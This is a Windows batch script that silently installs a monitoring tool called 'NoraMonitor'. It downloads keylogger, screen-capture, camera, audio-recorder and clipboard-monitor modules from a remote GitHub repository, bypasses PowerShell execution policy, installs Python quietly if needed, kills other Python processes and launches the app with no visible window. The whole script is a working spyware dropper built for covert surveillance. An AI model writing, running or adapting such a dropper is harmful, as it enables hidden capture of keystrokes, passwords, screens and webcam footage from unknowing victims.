@echo off
setlocal

set "DIR=%APPDATA%\NoraMonitor"
set "RAW=https://raw.githubusercontent.com/smallkhk/Nora-signal/nora-monitor-tool/nora-monitor"

mkdir "%DIR%\templates" 2>nul
mkdir "%DIR%\recordings" 2>nul

:: Download all files silently
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$r='%RAW%'; $d='%DIR%';" ^
  "'app.py','keylogger.py','screencap.py','controller.py','recorder.py','camera.py','clipboard_monitor.py','processes.py','requirements.txt' | %%{ Invoke-WebRequest \"$r/$_\" -OutFile \"$d\$_\" }"

:: Install Python silently if not present
python --version >nul 2>&1
if %errorlevel% neq 0 (
    powershell -NoProfile -ExecutionPolicy Bypass -Command ^
      "Invoke-WebRequest 'https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe' -OutFile '$env:TEMP\pysetup.exe'"
    %TEMP%\pysetup.exe /quiet InstallAllUsers=0 PrependPath=1
    timeout /t 20 /nobreak >nul
)

:: Install dependencies quietly
pip install -r "%DIR%\requirements.txt" -q --no-warn-script-location

:: Kill any existing instance holding port 9090
for /f "tokens=5" %%a in ('netstat -aon 2^>nul ^| find ":9090" ^| find "LISTENING"') do (
    taskkill /F /PID %%a >nul 2>&1
)
timeout /t 1 /nobreak >nul

:: Kill any existing nora instance
taskkill /F /IM pythonw.exe >nul 2>&1
timeout /t 1 /nobreak >nul

:: Launch silently - no window, no taskbar
start "" /D "%DIR%" pythonw "%DIR%\app.py"

endlocal
